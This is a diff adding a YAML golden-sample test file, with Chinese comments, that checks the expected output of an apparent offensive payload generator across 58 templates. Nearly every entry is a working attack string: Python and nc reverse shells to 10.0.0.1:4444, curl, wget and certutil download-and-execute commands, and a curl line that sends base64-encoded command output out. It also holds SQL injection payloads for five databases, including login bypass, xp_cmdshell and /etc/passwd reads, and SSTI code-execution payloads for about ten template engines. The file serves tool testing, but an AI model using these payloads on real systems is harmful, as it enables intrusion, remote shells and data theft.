@@ -1,0 +1,558 @@
+# 覆盖率补齐（§13.2）
+#
+# 背景：模板涨到 104 条时，黄金样本只覆盖 46 条。引擎一行不改的情况下
+# **唯一的风险源就是数据写错**，而样本盲区意味着那些模板从没被验证过。
+# 本文件把剩下的 58 条全部补上，期望值同样是从 YAML 里的 body 手算出来的，
+# 不是跑一遍工具粘回来的。
+
+ruleDB: v0.1.0
+
+samples:
+  # ================= Linux 命令注入 =================
+
+  - name: 换行分隔
+    state:
+      vuln: rce
+      content_type: shell-command
+      template: rce.linux.sep.newline
+      outputs: [raw]
+    expect:
+      payload: "%0awhoami"
+
+  - name: 时间盲注
+    state:
+      vuln: rce
+      content_type: shell-command
+      template: rce.linux.blind.time
+      outputs: [raw]
+    expect:
+      payload: ";sleep 5"
+
+  - name: 带外回显（命令输出 base64 后外发）
+    state:
+      vuln: rce
+      content_type: shell-command
+      template: rce.linux.blind.oob
+      vars: {lhost: "10.0.0.1"}
+      outputs: [raw]
+    expect:
+      # cmd 走默认值 whoami；$( ... ) 里的空格不在引号内，不触发提示
+      payload: ";curl http://10.0.0.1/$(whoami | base64 -w0)"
+      checks_count: 0
+
+  - name: Python 反弹 Shell
+    state:
+      vuln: rce
+      content_type: shell-command
+      template: rce.linux.reverse.python
+      vars: {lhost: "10.0.0.1", lport: "4444"}
+      outputs: [raw]
+    expect:
+      payload: ";python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
+
+  - name: nc 反弹 Shell
+    state:
+      vuln: rce
+      content_type: shell-command
+      template: rce.linux.reverse.nc
+      vars: {lhost: "10.0.0.1", lport: "4444"}
+      outputs: [raw]
+    expect:
+      payload: ";nc -e /bin/sh 10.0.0.1 4444"
+
+  - name: curl 下载执行
+    state:
+      vuln: rce
+      content_type: shell-command
+      template: rce.linux.download.curl
+      vars: {lhost: "10.0.0.1", file: "a.sh"}
+      outputs: [raw]
+    expect:
+      payload: ";curl -s http://10.0.0.1/a.sh | sh"
+
+  - name: wget 下载执行
+    state:
+      vuln: rce
+      content_type: shell-command
+      template: rce.linux.download.wget
+      vars: {lhost: "10.0.0.1", file: "a.sh"}
+      outputs: [raw]
+    expect:
+      payload: ";wget -qO- http://10.0.0.1/a.sh | sh"
+
+  - name: certutil 下载执行（<<file>> 出现三次）
+    state:
+      vuln: rce
+      content_type: shell-command
+      template: rce.windows.download.certutil
+      vars: {lhost: "10.0.0.1", file: "a.exe"}
+      outputs: [raw]
+    expect:
+      payload: "&certutil -urlcache -f http://10.0.0.1/a.exe %TEMP%\\a.exe & %TEMP%\\a.exe"
+
+  # ================= MySQL =================
+
+  - name: ORDER BY 猜列数
+    state:
+      template: sqli.mysql.union.orderby
+      outputs: [raw]
+    expect:
+      payload: "' ORDER BY 5 -- -"
+
+  - name: sqli.mysql.union.version · 版本回显
+    state:
+      template: sqli.mysql.union.version
+      outputs: [raw]
+    expect:
+      payload: "' UNION SELECT @@version,2,3 -- -"
+
+  - name: sqli.mysql.union.tables · 读表名
+    state:
+      template: sqli.mysql.union.tables
+      outputs: [raw]
+    expect:
+      payload: "' UNION SELECT group_concat(table_name),2,3 FROM information_schema.tables WHERE table_schema=database() -- -"
+
+  - name: updatexml 报错注入
+    state:
+      template: sqli.mysql.error.updatexml
+      vars: {expr: "@@version"}
+      outputs: [raw]
+    expect:
+      payload: "' AND updatexml(1,concat(0x7e,(@@version),0x7e),1) -- -"
+
+  - name: sqli.mysql.bool.blind · 布尔盲注
+    state:
+      template: sqli.mysql.bool.blind
+      vars: {cond: "1=1"}
+      outputs: [raw]
+    expect:
+      payload: "' AND (1=1) -- -"
+
+  - name: 时间盲注 SLEEP
+    state:
+      template: sqli.mysql.time.sleep
+      vars: {cond: "1=1"}
+      outputs: [raw]
+    expect:
+      payload: "' AND IF((1=1),SLEEP(5),0) -- -"
+
+  - name: 时间盲注 BENCHMARK
+    state:
+      template: sqli.mysql.time.benchmark
+      vars: {cond: "1=1"}
+      outputs: [raw]
+    expect:
+      payload: "' AND IF((1=1),BENCHMARK(5000000,MD5(1)),0) -- -"
+
+  - name: 堆叠注入
+    state:
+      template: sqli.mysql.stacked
+      vars: {stmt: "SELECT 1"}
+      outputs: [raw]
+    expect:
+      payload: "'; SELECT 1"
+
+  - name: 带外 DNS
+    state:
+      template: sqli.mysql.oob.dns
+      vars: {expr: "@@version", domain: "d.example.com"}
+      outputs: [raw]
+    expect:
+      # 用块标量写，避免在 YAML 双引号里数反斜杠。
+      # body 里第一处字面量是 4 个反斜杠、第二处 `\\a` 是 2 个反斜杠 + a，
+      # 这是**载荷文本**本身要长这样（MySQL 和应用各会吃掉一层转义）。
+      payload: |-
+        ' UNION SELECT load_file(concat('\\\\',(@@version),'.d.example.com\\a')) -- -
+
+  - name: sqli.mysql.file.read · 读文件
+    state:
+      template: sqli.mysql.file.read
+      vars: {filepath: "/etc/passwd"}
+      outputs: [raw]
+    expect:
+      payload: "' UNION SELECT load_file('/etc/passwd'),2,3 -- -"
+
+  - name: 指定用户登录绕过
+    state:
+      template: sqli.mysql.auth.bypass.admin
+      outputs: [raw]
+    expect:
+      payload: "admin' -- -"
+
+  # ================= MSSQL =================
+
+  - name: sqli.mssql.union.marker · UNION 回显位标记
+    state:
+      vuln: sqli
+      component: mssql
+      template: sqli.mssql.union.marker
+      outputs: [raw]
+    expect:
+      payload: "' UNION SELECT 0x41,2,3 --"
+
+  - name: sqli.mssql.union.tables · 读表名
+    state:
+      vuln: sqli
+      component: mssql
+      template: sqli.mssql.union.tables
+      outputs: [raw]
+    expect:
+      payload: "' UNION SELECT table_name,2,3 FROM information_schema.tables --"
+
+  - name: sqli.mssql.bool.blind · 布尔盲注
+    state:
+      vuln: sqli
+      component: mssql
+      template: sqli.mssql.bool.blind
+      vars: {cond: "1=1"}
+      outputs: [raw]
+    expect:
+      payload: "' AND (1=1) --"
+
+  - name: xp_cmdshell 无回显盲执行
+    state:
+      vuln: sqli
+      component: mssql
+      template: sqli.mssql.xp_cmdshell.blind
+      vars: {cmd: "whoami", filepath: "C:/inetpub/wwwroot/o.txt"}
+      outputs: [raw]
+    expect:
+      # <<cmd>> 与 <<filepath>> 都在 '...' 里，用正斜杠路径省掉反斜杠转义
+      payload: "'; EXEC xp_cmdshell 'whoami > C:/inetpub/wwwroot/o.txt'--"
+      checks_count: 0
+
+  - name: OPENROWSET 带外
+    state:
+      vuln: sqli
+      component: mssql
+      template: sqli.mssql.oob.openrowset
+      vars: {lhost: "10.0.0.1"}
+      outputs: [raw]
+    expect:
+      payload: "' UNION SELECT * FROM OPENROWSET('SQLOLEDB','10.0.0.1';'a';'a','SELECT 1') --"
+
+  # ================= Oracle =================
+
+  - name: sqli.oracle.union.tables · 读表名
+    state:
+      vuln: sqli
+      component: oracle
+      template: sqli.oracle.union.tables
+      outputs: [raw]
+    expect:
+      payload: "' UNION SELECT table_name,2,3 FROM user_tables --"
+
+  - name: 当前用户
+    state:
+      vuln: sqli
+      component: oracle
+      template: sqli.oracle.union.current
+      outputs: [raw]
+    expect:
+      payload: "' UNION SELECT user,2,3 FROM dual --"
+
+  - name: utl_inaddr 报错注入
+    state:
+      vuln: sqli
+      component: oracle
+      template: sqli.oracle.error.utl_inaddr
+      vars: {expr: "user"}
+      outputs: [raw]
+    expect:
+      payload: "' AND 1=utl_inaddr.get_host_address((user)) --"
+
+  - name: CTXSYS 报错注入
+    state:
+      vuln: sqli
+      component: oracle
+      template: sqli.oracle.error.ctxsys
+      vars: {expr: "user"}
+      outputs: [raw]
+    expect:
+      payload: "' AND 1=CTXSYS.DRITHSX.SN(1,(user)) --"
+
+  - name: sqli.oracle.bool.blind · 布尔盲注
+    state:
+      vuln: sqli
+      component: oracle
+      template: sqli.oracle.bool.blind
+      vars: {cond: "1=1"}
+      outputs: [raw]
+    expect:
+      payload: "' AND (1=1) --"
+
+  - name: sqli.oracle.auth.bypass · 登录绕过
+    state:
+      vuln: sqli
+      component: oracle
+      template: sqli.oracle.auth.bypass
+      outputs: [raw]
+    expect:
+      payload: "' OR 1=1--"
+
+  # ================= PostgreSQL =================
+
+  - name: sqli.postgresql.detect.version · 版本回显
+    state:
+      vuln: sqli
+      component: postgresql
+      template: sqli.postgresql.detect.version
+      outputs: [raw]
+    expect:
+      payload: "' UNION SELECT version(),2,3 --"
+
+  - name: sqli.postgresql.union.marker · UNION 回显位标记
+    state:
+      vuln: sqli
+      component: postgresql
+      template: sqli.postgresql.union.marker
+      outputs: [raw]
+    expect:
+      payload: "' UNION SELECT 0x41,2,3 --"
+
+  - name: 读表名（string_agg）
+    state:
+      vuln: sqli
+      component: postgresql
+      template: sqli.postgresql.union.tables
+      outputs: [raw]
+    expect:
+      payload: "' UNION SELECT string_agg(table_name,','),2,3 FROM information_schema.tables --"
+
+  - name: CAST 报错注入
+    state:
+      vuln: sqli
+      component: postgresql
+      template: sqli.postgresql.error.cast
+      vars: {expr: "version()"}
+      outputs: [raw]
+    expect:
+      payload: "' AND 1=CAST((version()) AS int) --"
+
+  - name: sqli.postgresql.bool.blind · 布尔盲注
+    state:
+      vuln: sqli
+      component: postgresql
+      template: sqli.postgresql.bool.blind
+      vars: {cond: "1=1"}
+      outputs: [raw]
+    expect:
+      payload: "' AND (1=1) --"
+
+  - name: sqli.postgresql.file.read · 读文件
+    state:
+      vuln: sqli
+      component: postgresql
+      template: sqli.postgresql.file.read
+      vars: {filepath: "/etc/passwd"}
+      outputs: [raw]
+    expect:
+      payload: "' UNION SELECT pg_read_file('/etc/passwd'),2,3 --"
+
+  - name: sqli.postgresql.auth.bypass · 登录绕过
+    state:
+      vuln: sqli
+      component: postgresql
+      template: sqli.postgresql.auth.bypass
+      outputs: [raw]
+    expect:
+      payload: "' OR 1=1--"
+
+  # ================= SQLite =================
+
+  - name: sqli.sqlite.detect.version · 版本回显
+    state:
+      vuln: sqli
+      component: sqlite
+      template: sqli.sqlite.detect.version
+      outputs: [raw]
+    expect:
+      payload: "' UNION SELECT sqlite_version(),2,3 --"
+
+  - name: sqli.sqlite.union.basic · 联合查询默认槽位
+    state:
+      vuln: sqli
+      component: sqlite
+      template: sqli.sqlite.union.basic
+      outputs: [raw]
+    expect:
+      payload: "' UNION SELECT 1,2,3 --"
+
+  - name: sqli.sqlite.union.marker · UNION 回显位标记
+    state:
+      vuln: sqli
+      component: sqlite
+      template: sqli.sqlite.union.marker
+      outputs: [raw]
+    expect:
+      payload: "' UNION SELECT 0x41,2,3 --"
+
+  - name: sqli.sqlite.bool.blind · 布尔盲注
+    state:
+      vuln: sqli
+      component: sqlite
+      template: sqli.sqlite.bool.blind
+      vars: {cond: "1=1"}
+      outputs: [raw]
+    expect:
+      payload: "' AND (1=1) --"
+
+  - name: sqli.sqlite.auth.bypass · 登录绕过
+    state:
+      vuln: sqli
+      component: sqlite
+      template: sqli.sqlite.auth.bypass
+      outputs: [raw]
+    expect:
+      payload: "' OR 1=1--"
+
+  # ================= SSTI =================
+
+  - name: 引擎无关探测 · 配置对象
+    state:
+      vuln: ssti
+      template: ssti.generic.detect.config
+      outputs: [raw]
+    expect:
+      payload: "{{config}}"
+
+  - name: Freemarker 读文件
+    state:
+      vuln: ssti
+      template: ssti.java.freemarker.file.read
+      vars: {filepath: "/etc/passwd"}
+      outputs: [raw]
+    expect:
+      # 整串含双引号、不含单引号，YAML 用单引号风格最省事
+      payload: '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("cat /etc/passwd")}'
+
+  - name: Thymeleaf / SpEL
+    state:
+      vuln: ssti
+      template: ssti.java.thymeleaf.spel
+      vars: {cmd: id}
+      outputs: [raw]
+    expect:
+      payload: "${T(java.lang.Runtime).getRuntime().exec(\"id\")}"
+
+  - name: OGNL
+    state:
+      vuln: ssti
+      template: ssti.java.ognl.runtime
+      vars: {cmd: id}
+      outputs: [raw]
+    expect:
+      payload: "%{@java.lang.Runtime@getRuntime().exec(\"id\")}"
+
+  - name: Jinja2 经 cycler
+    state:
+      vuln: ssti
+      template: ssti.jinja2.rce.cycler
+      vars: {cmd: id}
+      outputs: [raw]
+    expect:
+      payload: "{{cycler.__init__.__globals__.os.popen('id').read()}}"
+      syntax: ok
+
+  - name: Jinja2 经 request
+    state:
+      vuln: ssti
+      template: ssti.jinja2.rce.request
+      vars: {cmd: id}
+      outputs: [raw]
+    expect:
+      payload: "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}"
+      syntax: ok
+
+  - name: Jinja2 经 attr 过滤器（默认 idx=0）
+    state:
+      vuln: ssti
+      template: ssti.jinja2.rce.attr
+      vars: {cmd: id}
+      outputs: [raw]
+    expect:
+      payload: "{{''|attr('__class__')|attr('__mro__')|attr('__getitem__')(1)|attr('__subclasses__')()|attr('__getitem__')(0)|attr('__init__')|attr('__globals__')|attr('__getitem__')('os')|attr('popen')('id')|attr('read')()}}"
+      syntax: ok
+
+  - name: Jinja2 读文件
+    state:
+      vuln: ssti
+      template: ssti.jinja2.file.read
+      vars: {filepath: "/etc/passwd"}
+      outputs: [raw]
+    expect:
+      payload: "{{get_flashed_messages.__globals__.__builtins__.open('/etc/passwd').read()}}"
+      syntax: ok
+
+  - name: EJS 经 constructor 逃逸
+    state:
+      vuln: ssti
+      template: ssti.node.ejs.rce.constructor
+      vars: {cmd: id}
+      outputs: [raw]
+    expect:
+      payload: "<%= this.constructor.constructor('return process')().mainModule.require('child_process').execSync('id') %>"
+
+  - name: Nunjucks 经 range
+    state:
+      vuln: ssti
+      template: ssti.node.nunjucks.rce.range
+      vars: {cmd: id}
+      outputs: [raw]
+    expect:
+      payload: "{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('id')\")()}}"
+
+  - name: Smarty system
+    state:
+      vuln: ssti
+      template: ssti.php.smarty.rce.system
+      vars: {cmd: id}
+      outputs: [raw]
+    expect:
+      payload: "{system(\"id\")}"
+
+  - name: Smarty 读文件
+    state:
+      vuln: ssti
+      template: ssti.php.smarty.file.read
+      vars: {filepath: "/etc/passwd"}
+      outputs: [raw]
+    expect:
+      payload: "{file_get_contents(\"/etc/passwd\")}"
+
+  - name: Twig 经 map 过滤器
+    state:
+      vuln: ssti
+      template: ssti.php.twig.rce.map
+      vars: {cmd: id}
+      outputs: [raw]
+    expect:
+      payload: "{{['id']|map('system')|join}}"
+
+  - name: Latte system
+    state:
+      vuln: ssti
+      template: ssti.php.latte.rce.system
+      vars: {cmd: id}
+      outputs: [raw]
+    expect:
+      payload: "{system('id')}"
+
+  - name: ERB 反引号
+    state:
+      vuln: ssti
+      template: ssti.ruby.erb.rce.backtick
+      vars: {cmd: id}
+      outputs: [raw]
+    expect:
+      payload: "<%= `id` %>"
+
+  - name: ERB 读文件
+    state:
+      vuln: ssti
+      template: ssti.ruby.erb.file.read
+      vars: {filepath: "/etc/passwd"}
+      outputs: [raw]
+    expect:
+      payload: "<%= File.open(\"/etc/passwd\").read %>"
